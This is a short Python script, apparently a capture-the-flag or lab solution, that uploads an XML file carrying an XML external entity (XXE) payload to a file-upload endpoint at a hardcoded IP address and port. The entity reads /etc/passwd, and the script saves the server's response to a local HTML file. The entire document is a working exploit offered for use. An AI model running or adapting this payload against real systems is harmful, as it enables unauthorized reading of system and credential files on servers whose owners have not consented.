import requests

r = requests.post(
    'http://43.241.202.33:3003/file-upload',
    files={
        'file': ('exploit.xml',
                 # https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [\n  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">\n]><creds><user>&xxe;</user><pass>mypass</pass></creds>')
    }
)

print("Status code:", str(r.status_code) + "\n")

with open("XXE.html", "w") as f:
    f.write(r.text)

print("Saved as XXE.html")
